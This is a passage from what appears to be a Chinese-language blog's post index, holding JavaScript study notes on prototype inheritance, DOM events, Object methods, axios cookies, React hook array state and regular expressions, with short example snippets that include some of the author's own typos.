原型模式的缺点原型模式对于基本数据类型很适用，对于引用类型来说，其中函数由于本身就需要共享，因此也很适用，但对于数组、对象等不共享的引用类型： 12345678910111213function p()&#123;&#125;p.prototype = &#123; constructor:p, name:'tom', age:20, arr:[1, 2]&#125;var f1 = new p()var f2 = new p()f1.arr.push(3)f1.arr //[1, 2, 3]f2.arr //[1, 2, 3]//f1和f2共享同一个原型实例，因此对于引用类型，也是指向同一个属性，一个实例的更改会影响另一个实例 还有一个致命缺陷：不能通过构造函数传参 组合使用构造函数模式和原型模式了解了构造函数模式和原型模式的优缺点，我们就可以取长补短 构造函数模式：定义实例属性 原型模式：定义函数方法以及一些需要共享的属性 好处：最大限度节约了内存，还能支持构造函数传参 123456789101112131415161718function p(name, age, job)&#123; this.name = name this.age = age this.job = job this.arr = [1, 2, 3]&#125;p.prototype = &#123; constructor:p, sayname:function()&#123; console.log(this.name) &#125;&#125;var p1 = new p('tom', 20, 'teacher')var p2 = new p('jack', 20, 'doctor')p1.arr.push(4)p1.arr //[1, 2, 3, 4]p2.arr//[1, 2, 3]p1.sayname === p2.sayname // true 基本上这是ES5最广泛最受认可的一种自定义类型的方法 动态原型模式12345678910function p(name, age, job)&#123; this.name = name this.age = age this.job = job if(typeof this.sayname !== function)&#123; p.prototype.sayname = function()&#123; console.log(this.name) &#125; &#125;&#125; 寄生构造函数模式12345678910function p(name, age, job)&#123; var o = &#123;&#125; o.name = name o.age = age o.job = job o.sayname = function()&#123; console.log(this.name) &#125;&#125;var p1 = new p() 这种方式和工厂模式的区别就是用new操作符创建对象 稳妥构造函数模式… 原型链利用原型让一个引用类型继承另一个引用类型，三角关系层层递进，就构成了实例与原型的链条，这就是原型链读取实例的属性时，搜索的过程就是沿着原型链网上搜索 默认原型所有实例的默认原型就是Object的实例，因此默认原型内部指针指向Object.prototype instanceof操作符只要原型链中存在构造函数的prototype，就认为这个是该构造函数的实例 123b instanceof B //trueb instanceof A//trueb instanceof Object//true 覆盖父类的方法无论是给原型添加方法还是重写原型中的方法，都要放在替换原型的语句之后 123456function Parent()&#123;&#125;Parent.prototype.fun1 = function()&#123;...&#125;function Son()&#123;&#125;Son.prototype = new Parent()Son.prototype.fun2 = function()&#123;...&#125;//添加方法Son.prototype.fun1 = function()&#123;...&#125;//重写方法 注意：在继承时不可以使用对象字面量创建原型，这样会破坏原型链 12345Son.prototype = &#123; fun1:function()&#123;...&#125;, fun2:function()&#123;...&#125;&#125;//错误 原型链存在的问题 引用类型的属性值会被原型链上所有实例共享，一个实例对一个引用类型值的修改 ，会在另一个实例上表现出来，参考原型模式创建对象 子类型无法在不影响所有实例的前提下给超类传递参数 继承方法经典继承（借用构造函数）.123456function parent()&#123; arr:[1, 2, 3]&#125;function son()&#123; parent.call(this)&#125; 这种方法实际上是在son环境下调用parent，这是son的每一个实例都会有一份arr的副本，而不用担心引用类型的问题优点：可以传递参数缺点：方法在构造函数中国定义，不便于函数复用 超类原型中的方法对于子类不可见(无法继承方法) 组合继承（伪经典继承）1234567891011function parent(name)&#123; this.name = name this.arr = [1, 2, 3]&#125;parent.prototype.sayname = function()&#123;console.log(this.name)&#125;function son(name, age)&#123; parent.call(this,name) //继承属性（第一次调用构造函数） this.age = age&#125;//son.prototype = new parent()//继承方法（第二次调用构造函数） 优点：避免了原型链和借用构造函数的缺陷，是js最常见的继承模式 缺点：超类构造函数被调用了两次,导致子类的原型上多了不需要的父类属性，存在内存上的浪费 原型继承ES5提供了Object.create函数，它接收两个参数 用作原型的对象 新对象额外属性组成的对象 12345678910var person = &#123; name:'tom', arr:[1, 2, 3]&#125;var obj = Object.create(person, &#123; age:&#123; value:20 &#125;&#125;)obj.age //20 注意：这种方式会把原型链的缺陷再次暴露，父类的引用类型会被所有实例共享 因为这个函数内部的运行原理是这样的： 12345function create(o)&#123; function F()&#123;&#125; F.prototype = o return new F()&#125; 寄生式继承封装一个原型式继承的过程 12345function create(o)&#123; var obj = Object.create(o) obj.fun = function()&#123;...&#125; return obj&#125; 寄生组合式继承解决组合式继承中调用两次超类构造函数的问题与组合式继承唯一的不同，就是用原型继承的步骤，代替了son.prototype = new parent() 12345678910111213141516function parent(name)&#123; this.name = name&#125;parent.saynamne = function()&#123;...&#125;function son(name, age)&#123; parent.call(this, name) this.age = age&#125;//下面这一步代替了son.prototype = new parent()来继承方法，不会调用超类构造函数function inherit(son, parent)&#123; var o = Object.create(parent.prototype) o.constructor = son son.prototype = o]inherit(son, parent)son.sayage = function()&#123;...&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"事件","slug":"事件","date":"2020-02-10T16:00:00.000Z","updated":"2024-05-25T04:21:29.712Z","comments":true,"path":"2020/02/11/事件/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/11/%E4%BA%8B%E4%BB%B6/","excerpt":"事件","text":"事件 JavaScript与HTML之间的交互是通过事件实现的。可以使用一些侦听器来预定事件，以便在事件发生时执行相应的代码。 事件冒泡事件一开始时由具体的元素接收，然后向上传播到较为不具体的节点。例如我们点击一个按钮时，就会产生一个click事件，但这个按钮本身可能不能处理这个事件，事件必须从这个按钮传播出去，从而到达能够处理这个事件的代码中（例如我们给按钮的onclick属性赋一个函数的名字，就是让这个函数去处理该按钮的click事件），或者按钮的父级绑定有事件函数，当该点击事件发生在按钮上，按钮本身并无处理事件函数，则传播到父级去处理。 事件捕获从不太具体的节点更早接收事件，而最具体的节点最后接收到事件。事件捕获的目的在于事件到达预定目标之前捕获它。即自上而下的去触发事件 事件流“DOM2级事件”规定的事件流包括三个阶段： 事件捕获阶段 处于目标阶段 事件冒泡阶段 上面这个图就描述了一个事件按如上这个顺序进行触发。 如果要测试上面这个顺序，先来了解DOM2级事件处理程序 DOM2级事件处理——addEventListeneraddEventListener是DOM2级事件新增的指定事件处理程序的操作，这个方法接收3个参数：要处理的事件名，作为事件处理程序的函数和一个布尔值，最后这个布尔值如果是true，表示在捕获阶段调用事件处理程序；如果是false，表示在冒泡阶段调用事件处理程序。默认情况下第二个参数值为false，也就是说DOM2级事件处理程序默认是在冒泡阶段处理事件。通过addEventListener添加的事件处理程序只能通过removeEventListener()来移除 1234567891011121314151617181920212223242526272829303132333435363738window.onload &#x3D; function()&#123; var oBtn &#x3D; document.getElementById(&#39;btn&#39;); oBtn.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;btn处于事件捕获阶段&#39;); &#125;, true); oBtn.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;btn处于事件冒泡阶段&#39;); &#125;, false); document.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;document处于事件捕获阶段&#39;); &#125;, true); document.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;document处于事件冒泡阶段&#39;); &#125;, false); document.documentElement.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;html处于事件捕获阶段&#39;); &#125;, true); document.documentElement.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;html处于事件冒泡阶段&#39;); &#125;, false); document.body.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;body处于事件捕获阶段&#39;); &#125;, true); document.body.addEventListener(&#39;click&#39;,function()&#123; console.log(&#39;body处于事件冒泡阶段&#39;); &#125;, false); &#125;;&#x2F;&#x2F;html&lt;body&gt; &lt;a href&#x3D;&quot;javascript:;&quot; id&#x3D;&quot;btn&quot;&gt;按钮&lt;&#x2F;a&gt;&lt;&#x2F;body&gt; 效果 HTML事件处理程序某个元素支持某种事件，都可以使用一个与相应事件处理程序同名的HTML特性来指定，这个特性的值应该是能够执行的javascript代码。 1&lt;input type = \"button\" onclick = \"alert('click')\"&gt; 这个操作通过指定onclick特性并将一些javascript代码作为它的值来定义。因此不能再其中使用未经过转义的html语法字符，例如&amp;，””，&lt;&gt;。 html事件处理程序可以包含具体的动作，也可以调用其他地方定义的脚本 123456&lt;script&gt; function showMessage()&#123; alert('click'); &#125;&lt;/script&gt;&lt;input type = \"button\" onclick = \"showMessage()\"&gt; 这样指定事件处理程序有一个独到之处。首先会创建一个封装着元素属性值的函数，这个函数中有一个局部变量event，也就是事件对象。 12&lt;input type = \"button\" onclick = \"alert(event.tyep)\"&gt;//click 通过event变量，可以直接访问事件对象，在这个函数内部，this的值等于事件的目标元素 12&lt;input type = \"button\" value = \"click me\" onclick = \"alert(this.value)\"&gt;//click me 关于这样动态创建的函数，在这个函数的内部，可以像访问局部变量一样访问document及该元素本身的成员。前提是这个函数使用with像这样扩展作用域链 1234567function()&#123; with(document)&#123; with(this)&#123; //... &#125; &#125;&#125; 这样访问自己的属性就简单多了 1234567891011&lt;script&gt; function showMessage()&#123; with(document)&#123; with(this)&#123; //... var val = value &#125; alert(val)//hhh &#125;&lt;/script&gt;&lt;input type = \"button\" value = \"hhh\" onclick = \"showMessage()\"&gt; html事件处理的缺点时差问题：以上面的栗子，如果在showMessage()解析之前就单击了按钮触发了事件，就会引发错误。因此，很多html事件都会被封装在try-catch中，因此上面的代码实际上是这样的 1&lt;input type = \"button\" value = \"hhh\" onclick = \"try&#123;showMessage()&#125;catch(er)&#123;&#125;\"&gt; 因此就算发生这种情况，用户也看不到js的报错提示 扩展事件处理程序的作用域链在不同浏览器中会导致不同的结果 HTML和javascript代码紧耦合，不利于后期代码维护 DOM0级事件处理程序将函数赋值给一个事件处理程序属性。首先获取一个要操作的对象的引用。每个元素都有自己的时间处理程序属性 1234var btn = document.getElementById('myBtn')btn.onclick = function()&#123; alert('hhh')&#125; 注意：使用DOM0级事件处理程序被认为是元素的方法，这个时候事件处理程序是在元素的作用域中运行，换句话说这时函数的this指向当前元素 12345&lt;input type = \"button\" value = \"hhh\" id = \"myBtn\"&gt;var btn = document.getElementById('myBtn')btn.onclick = function()&#123; alert(this.id)//myBtn&#125; 实际上可以在事件处理程序中访问元素的任何属性和方法，以这种方式添加的事件处理程序会在事件流的冒泡阶段被处理执行 可以删除DOM0级方法指定的事件处理程序 1btn.onclick = null 事件对象在触发DOM上某个事件，会产生一个事件对象，包含所有与时间有关的信息。无论指定事件处理程序使用DOM0还是DOM2，都会传入event对象 123456789var btn = document.getElementById('MmyBtn')btn.onclick = function()&#123; alert(event.type)&#125;//clickbtn.addEventListener('click',function()&#123; alert(event.type)&#125;,false)//click 使用html事件处理程序时，也可以直接使用event变量 1&lt;input type = \"button\" onclick = \"alert(event.tyep)\"&gt; event对象的一些属性和方法 2 级 DOM 事件标准定义的event属性注意：stopPropagation() 可以立即停止事件在DOM中传播，取消进一步的事件捕获或冒泡。 12345678var btn = document.getElementById('myBtn')btn.onclick = function()&#123; alert('hhh') event.stopPropagation()&#125;document.body.onclick = function()&#123; alert('body click')&#125; 这样上面的两个事件处理程序就不会发生冲突 内存与性能在javascript中，添加到页面上的事件处理程序将直接关系到页面的整体运行性能。因为每个函数都是对象，都会占用内存；内存中对象越多，性能就越差。其次，必须事先指定所有事件处理程序而导致的DOM访问次数，会延迟整个页面的交互就绪时间。 事件委托对于“事件处理程序”过多的解决方案就是事件委托。事件委托利用了事件冒泡，只指定一个事件处理程序就可以管理某一类型的所有事件。可以大量节省内存占用，减少事件注册，比如在table上代理所有td的click事件就非常棒可以实现当新增子对象时无需再次对其绑定 移除事件处理程序一方面可以使用事件委托减少事件处理程序，另一方面可以移除不需要的事件处理程序。有时候，内存中会留有一些过时不用的“空事件处理程序”，这也是造成web应用程序性能降低的主要原因。有两种情况会造成这个问题1、从文档中移除带有事件处理程序的元素时，如果通过纯粹的DOM操作，或innerHTML，那么原来添加到元素中的事件处理程序极有可能无法当做垃圾回收。 12345678910&lt;div id = \"myDiv\"&gt; &lt;input type = \"button\" value = \"click me\" id = \"myBtn\"&gt;&lt;/div&gt;&lt;script&gt; var btn = document.getElementById(\"myBtn\") btn.onclick = function()&#123; //某些操作 document.getElementById('myDiv').innerHTML = '' &#125;&lt;/script&gt; 上面这个例子中，点击按钮按钮消失，但问题是当它被移除时还保留着事件处理程序。在div元素上设置innerHTML把按钮移走，但是事件处理程序仍然与按钮保持着引用关系，有的浏览器（比如IE），会把元素和事件处理程序的引用都保存再内存中，不会被移除。因此这种情况下最好手动移除事件处理程序。 1234567891011&lt;div id = \"myDiv\"&gt; &lt;input type = \"button\" value = \"click me\" id = \"myBtn\"&gt;&lt;/div&gt;&lt;script&gt; var btn = document.getElementById(\"myBtn\") btn.onclick = function()&#123; //某些操作 btn.onclick = null document.getElementById('myDiv').innerHTML = '' &#125;&lt;/script&gt; 这样写就确保不会占用内存，而DOM中移除按钮也做到了干净利索。同时，在事件处理程序中删除按钮也能组织事件冒泡，因为目标元素在文档中是事件冒泡的前提。 2、卸载页面如果页面卸载之前没有清理干净事件处理程序，他们会滞留在内存中。这种情况在IE8以及更早版本IE 和部分其他浏览器问题最突出。最直观的表现就是刷新页面，卸载完页面再重新加载，每刷新一次，内存中滞留的对象数目就会增加，因为事件处理程序占用的内存并没有释放 一般来说最好的解决方案是通过onunload中移除所有事件处理程序 总结：对于以上两种问题，事件委托都能表现出不错的优势。把需要跟踪的事件处理程序数量减少，可以将解决这个问题变得简单。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"对象","slug":"对象","date":"2020-02-10T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/02/11/对象/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/11/%E5%AF%B9%E8%B1%A1/","excerpt":"JavaScript中的对象","text":"JavaScript中的对象 Object每个实例的方法 constructor：构造函数 hasOwnProperty(propertyname)：检查该属性在对象实例中是否存在（不检查原型） isPrototypeOf(obj)：检查传入的对象是不是当前对象的原型 propertyIsEnumerable(propertyname)：检查该属性是否可枚举 toLocalString()，toString()，valueOf()：返回对象的字符串表示/数值表示 属性类型——描述属性各种特征ES有两大类型属性：数据属性、访问器属性 数据属性 [[configurable]]：能否通过delete删除属性 [[enumerable]]：是否可枚举 [[writable]]：是否可修改 [[value]]：属性值 ES5可以通过使用 Object.getOwnpropertyDescriptor() 来获取属性的特征描述 使用 Object.defineProperty() 修改默认属性，接收三个参数：属性所在对象、属性名、描述对象 访问器属性 [[configurable]]：能否通过delete删除属性 [[enumerable]]：是否可枚举 [[Get]]：在读取属性时调用，默认为undefine [[Set]]：在写入属性时调用，默认为undefine 常见用途：修改一个属性值时让关联的另一个属性发生变化 123456789101112131415var book = &#123; year:2019, edition:1&#125;Object.defineProperty(book, 'year', &#123; get:function()&#123; return this.year &#125;, set:function(NewY)&#123; this.year = NewY edition += 1 &#125;&#125;)book.year = 2020book.edition //2 属性名表达式ES6允许在使用字面量定义对象时，将表达式作为属性名 123456789101112var last = 'last'var a = &#123; first:'first', [last]:'last'&#125;console.log(a.first) //firstconsole.log(a['first'])//firstconsole.log(a.[first])//errorconsole.log(a.last)//lastconsole.log(a[last])//lastconsole.log(a['last'])//last 注意：若属性名表达式是一个对象，默认情况下会把属性转换为：[object,object]。一个对象只能有一个对象属性名，多余的会被最后一个覆盖 12345678const a = &#123;a:1&#125;const b = &#123;b:2&#125;const c = &#123; [a]:1, [b]:2&#125;console.log(c)//&#123;[object,object]:2&#125; 方法的name属性该属性是函数的属性，返回函数名 123456const p = &#123; sayname()&#123; console.log('tom') &#125;&#125;console.log(p.sayname.name)//sayname 对于用bind产生的函数，会在名字前加上“bound” 12var fun = function()&#123;...&#125;console.log(fun.bind().name)//\"bound fun\" Object.is()用同值相等算法比较两个值严格相等对于es5中的 “ == ” 和 “ === ”，前者会自动转换数据类型，后者NaN不等于自身，因此ES6提供了新方法判断两个值严格相等 1234567Object.is('foo','foo')//trueObject.is(&#123;&#125;,&#123;&#125;)//false+0 === -0 //trueObject.is(+0, -0) // falseNaN === NaN //falseObject.is(NaN, NaN) //true Object.assign()将源对象所有可枚举属性复制到目标对象，第一个参数是目标对象， 后面所有参数都是源对象。 12345var target = &#123;a:1&#125;var source = &#123;b:2&#125;Object.assign(target, source)//target://&#123;a:1, b:2&#125; 当目标对象与源对象有重名属性，或多个源对象之间有重名属性，则后面的属性会覆盖之前的属性。 123456var target = &#123;a:1&#125;var source = &#123;b:2&#125;var source1 = &#123;b:3&#125;Object.assign(target, source, source1)//target://&#123;a:1, b:3&#125; 对于Object.assign()的参数 只有一个参数，直接返回参数 该参数不是对象，则转化为对象 参数为undefine或null，报错 非对象出现在非首参数（源对象）位置，只有字符串会以数组形式复制到目标对象当中，其他值无效123var v1 = 'abc'var obj = Object.assign(&#123;&#125;, v1)//&#123;0:'a', 1:'b', 2:'c'&#125; 注意：该方法不复制对象的继承属性和不可枚举属性该方法使用的是浅复制 123456var obj1 = &#123;a:1&#125;var obj2 = Object.assign(&#123;&#125;, obj1)obj2 //&#123;a:1&#125;obj1.a.b = 3obj2 //&#123;a:&#123;b:3&#125;&#125;//obj2得到的是obj1的引用 应用于数组既然数组实际上是对象，数组实际的存储是这样的{ ‘1’ : ‘a , ‘2’ : ‘b’, ‘3’ : ‘c’}所以对于数组的处理就比较特殊 12Object.assign([1,2,3], [4, 5]) //[4, 5, 3] Object.assign的用途 给对象添加属性 12345class point&#123; constructor(x, y)&#123; Object.assign(this, &#123;x, y&#125;) &#125;&#125; 给对象添加方法 123456var obj = &#123;&#125;Object.assign(obj.prototype, &#123; fun1(arg)&#123;...&#125;, fun2(arg)&#123;...&#125;, ...&#125;) 克隆对象 123456789function clone(obj)&#123; return Object.assign(&#123;&#125;, obj)&#125;//若要连带拷贝其继承属性function clone(obj)&#123; var proto = obj.__proto__ return Object.assign(&#123;&#125;, Object.create(proto, obj))&#125; 合并多个对象 1const merge = (...sou) =&gt; &#123;return Object.assign(&#123;&#125;, ...sou)&#125; 为属性指定默认值 1234const default = &#123;a:1, b:2&#125;function fun(option)&#123; Object.assign(&#123;&#125;, default, option)&#125; 属性的描述对象前面已经提到， ES5可以通过使用 Object.getOwnpropertyDescriptor() 来获取属性的特征描述 12345678910var obj = &#123;foo: 123&#125;Object.getOwnPropertyDescriptor(obj, 'foo')/*&#123; value:123, writable:true, enumerable:true, configurable:true&#125;*/ ES6规定：所有class的原型方法都是不可枚举的 ES6提供了Object.getOwnpropertyDescriptor()，返回所有对象属性的描述对象 1234567891011121314151617181920212223var obj = &#123; foo:123, get fun()&#123; return 'abc' &#125;&#125;Object.getOwnpropertyDescriptors(obj)/*&#123; foo:&#123; value:123, writable:true, enumerable:true, configurable:true &#125;, fun:&#123; get:[Function:fun], set:undefine, enumerable:true, configurable:true &#125;&#125;*/ 属性的遍历 for…in：遍历自身和继承的所有可继承属性 Object.key(obj)：返回数组，包含对象自身的所有可枚举属性 Object.getOwnPropertyName(obj)：返回数组，包含对象自身所有属性（不含symbol） Object.getOwnPropertySymbol(obj)：返回数组，包含对象自身所有symbol属性 Reflect.OwnKeys(obj)：返回数组，包含对象自身所有属性 这些遍历对象属性的方法均遵守： 属性名为数字，按数字排序 属性名为字符串或symbol，按生成顺序排序 若三者混合，则按数字 -&gt; 字符串 -&gt; symbol排序 Object.key()es5引入的该方法，返回一个数组，成员是参数自身的所有可枚举属性的键名 Object.values()返回一个数组，成员是参数自身的所有可遍历属性属性的键值 Object.entries()返回一个数组，成员是参数自身的所有克遍历属性的键值对数组 “ proto “用来读取设置当前对象的prototype对象。注意：这不是一个正式的对外开放的API，只不过广大浏览器支持了这个属性。一般建议使用Object.getPrototypeOf() Object.getPrototypeOf()和Object.setPrototypeOf()ES6推荐使用Object.setPrototypeOf()设置对象的原型，使用Object.getPrototypeOf()读取对象原型关于后者的参数 若是Number，String，boolean，则之间返回参数 若是undefine，null，则报错 对象的扩展运算符对象的解构赋值将对象可遍历却又未读取的属性分配到指定的对象上面 1234var &#123;x, y, ...z&#125; = &#123;x:1, y:2, a:3, b:4, c:5&#125;x//1y//2z//&#123;a:1, b:2, c:3&#125; 解构赋值等号右边不能是undefine或null，否则直接报错 123var &#123;x, y, ...z&#125; = undefinevar &#123;x, y, ...z&#125; = null//统统报错 注意：结构赋值的复制过程是浅复制，如果一个键的值是引用类型，那么解构赋值得到的是这个值的引用，同时，结构赋值也不会赋值继承自原型对象的属性 1234567891011var obj = &#123;a:1, b:2&#125;var a = &#123;...obj&#125;obj.a = 5console.log(a)//1var obj1 = &#123;a:1, b:2, c:&#123;d:3&#125;&#125;var b = &#123;...obj1&#125;obj1.c.d = 6console.log(b)//&#123;a:1, b:2, c:&#123;d:6&#125;&#125; 取出参数对象所有可遍历属性类似于Object.assign()的操作，也不能复制其继承属性123let z =&#123;a:3, b:4&#125;let k = &#123;...z&#125;//k:&#123;a:3, b:4&#125;稍作改进也可以复制其继承属性 12let z =&#123;a:3, b:4&#125;let k = &#123;...Object.create(Object.getPrototypeOf(z)),...z&#125; 他有和Object.assign()类似的作用 克隆对象12345let z =&#123;a:3, b:4&#125;z.__proto__.name = 'z'let k = &#123;...Object.create(Object.getPrototypeOf(z)),...z&#125;console.log(z)console.log(k) 合并对象123456let a = &#123;x:1&#125;let b = &#123;y:2&#125;let ab = &#123;...a, ...b&#125;//等价于let ab = Object.assign(&#123;&#125;, a, b) 扩展运算符后面的属性值会覆盖扩展运算符中的同名属性，同assign 添加默认值将用户定义的默认值放在运算符前面，就可以为对象设置默认值 1234let default = &#123;x:1, y:2, ...a&#125;//等同于let default = Object.assign(&#123;&#125;, &#123;x:1, y:2&#125;, a) 对象的扩展运算符后面可以带有表达式 1234var obj = &#123; ...(x &gt; 1 ? &#123;x:1&#125; : &#123;y:2&#125;), b:2&#125; 对象扩展运算符的参数为null或undefine时，这两个值会被忽略，不会报错 12345var avar b = nullvar c = &#123;...a&#125;var d = &#123;...b&#125;//均不报错","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"axios请求带cookie","slug":"axios请求带cookie","date":"2020-02-08T16:00:00.000Z","updated":"2024-05-25T02:28:45.247Z","comments":true,"path":"2020/02/09/axios请求带cookie/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/09/axios%E8%AF%B7%E6%B1%82%E5%B8%A6cookie/","excerpt":"","text":"axios请求默认不带cookieaxios默认是发送请求的时候不会带上cookie的，这导致当服务器使用session来保存登录态时，客户端永远无法登陆的情况。 123import axios from 'axios'; // 引入axiosaxios.defaults.withCredentials = true; // 允许携带cookie 这样即可解决","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"杂项","slug":"技术/前端/杂项","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E6%9D%82%E9%A1%B9/"}],"tags":[]},{"title":"react-hook中数组state的更新","slug":"react-hook中数组state的更新","date":"2020-02-03T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/02/04/react-hook中数组state的更新/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/04/react-hook%E4%B8%AD%E6%95%B0%E7%BB%84state%E7%9A%84%E6%9B%B4%E6%96%B0/","excerpt":"关于react hook中数组state的更新react hook只用了useState钩子函数来给函数（无状态）组件添加状态，今天在写一个小应用的时候就遇到了问题，我设置了一个状态为messagearr数组用来存储当前收到的消息，默认为空。当接收到新消息，则使用setMessagearr进行更新，但却遇到了问题我们已经知道react hook更新数组不是往原数组里添加项目，而是要用一个新数组完全替代，所以不能直接这样写 messagearr.push(newitem)setMessagearr(messagearr) 但是我用下面这个写法出现了问题","text":"关于react hook中数组state的更新react hook只用了useState钩子函数来给函数（无状态）组件添加状态，今天在写一个小应用的时候就遇到了问题，我设置了一个状态为messagearr数组用来存储当前收到的消息，默认为空。当接收到新消息，则使用setMessagearr进行更新，但却遇到了问题我们已经知道react hook更新数组不是往原数组里添加项目，而是要用一个新数组完全替代，所以不能直接这样写 messagearr.push(newitem)setMessagearr(messagearr) 但是我用下面这个写法出现了问题12345678910111213import React, &#123; useEffect, useState &#125; from 'react'function Index()&#123; const [messagearr, setMessagearr] = useState([]) //接收到新消息时调用这个函数 function changeMessageArr(e)&#123; setMessagearr([...messagearr,&#123;from:data.from, to:data.to, message:data.message&#125;]) console.log(messagearr) &#125; return ( )&#125;export default Index可以看到，每次接收到新消息，调用函数，明明已经向messagearr中添加新项目，但是打印出来全都是空数组折腾了一番，用下面的写法勉强解决，但是最终原因还要进一步学习研究 12345function changeMessageArr(e)&#123; // setMessagearr([...messagearr,&#123;from:e.from, to:e.to, message:e.message&#125;]) setMessagearr(messagearr =&gt; &#123;return [...messagearr,&#123;from:e.from, to:e.to, message:e.message&#125;]&#125;) console.log(messagearr) &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"杂项","slug":"技术/前端/杂项","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E6%9D%82%E9%A1%B9/"}],"tags":[]},{"title":"正则表达式","slug":"正则表达式","date":"2020-02-01T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/02/02/正则表达式/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/02/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"RegExp类型文章转载自js中正则表达式的使用，有部分删改.","text":"RegExp类型文章转载自js中正则表达式的使用，有部分删改. JS中使用正则表达式有两种方式 1、正则表达式字面量 var expression = / pattern / flags 其中的pattern部分可以使任何简单或复杂的正则表达式。每个正则表达式可以包含一个或多个flags，用以标注正则表达式的匹配模式 g：表示全局模式，应用于所有匹配的字符串 i：表示不区分大小写，即在匹配过程中忽略字符串的大小写 m：表示多行匹配 2、使用RegExp构造函数var reg = new RegExp(“正则表达式”, “匹配模式”); 两者的区别 一些字符的转义 使用RegExp构造函数时，所有元字符必须进行双重转义，转义过的字符也是如此 例如：\\通常被转义成为\\，但在正则表达式字符串中会变成\\\\ 正则表达式字面量和使用RegExp构造函数创建的正则表达式不一样（此问题只存在ES3，ES5已经做出修改）字面量方法始终会共享同一个RegExp实例，而使用构造函数创建的每一个RegExp实例都是一个新实例123456789101112var re = nullvar ifor(i = 0; i &lt; 10; i++)&#123; re = /cat/g re.test(\"catastrophe\")&#125;//匹配成功一次之后匹配失败for(i = 0; i &lt; 10; i++)&#123; re = new RegExp(\"cat\", 'g') re.test(\"catastrophe\")&#125;//十次都匹配成功 在第一个循环中，实际上只为/cat/指定了一个RegExp实例，又因为实例属性不会重置，所以当第二次及之后调用test()方法时，就会从上一次匹配的末尾继续查找匹配，并不会从头匹配，因此匹配失败。第二个循环则每次都是一个新的RegExp实例，每次匹配都从字符串开头匹配，所以可匹配成功 正则的一些元字符一些特殊含义的元字符 \\d : 0-9之间的任意一个数字 \\d只占一个位置\\w : 数字，字母 ，下划线 0-9 a-z A-Z _\\s : 空格或者空白等\\D : 除了\\d\\W : 除了\\w\\S : 除了\\s . : 除了\\n之外的任意一个字符 \\ : 转义字符 | : 或者() : 分组\\n : 匹配换行符\\b : 匹配边界 字符串的开头和结尾 空格的两边都是边界 =&gt; 不占用字符串位数 ^ : 限定开始位置 =&gt; 本身不占位置 $ : 限定结束位置 =&gt; 本身不占位置[a-z] : 任意字母 []中的表示任意一个都可以[^a-z] : 非字母 []中^代表除了[abc] : abc三个字母中的任何一个 [^abc]除了这三个字母中的任何一个字符 代表次数的特殊元字符 * : 0到多个 + : 1到多个? : 0次或1次 可有可无{n} : 正好n次；{n,} : n到多次{n,m} : n次到m次 量词出现在元字符后面 如\\d+，限定出现在前面的元字符的次数 1234var str = ' a string 'var reg = /^\\s+|\\s+$/gstr.replace(reg, '')//匹配字符串开头和结尾的空格str //a string 正则中的[]和()一般[]中的字符没有特殊含义，+就表示+，但是像\\w这种还是会有特殊含义 1234567var str = 'abc'var str1 = '.bc'var str2 = 'fbc'var reg = /[.ab]bc/reg.test(str)//truereg.test(str1)//truereg.test(str2)//false []中不会出现两位数，举个栗子：要求匹配年龄为18-65岁之间的人 12345678//这样写是不对的：var reg = /[18-65]/reg.test('50')//error//实际上，这个问题可以拆开解决var reg = /[18|19] | [2-5]\\d | (6[0-5])/reg.test('42')//true ()的作用： 提高优先级 分组（重复子项） 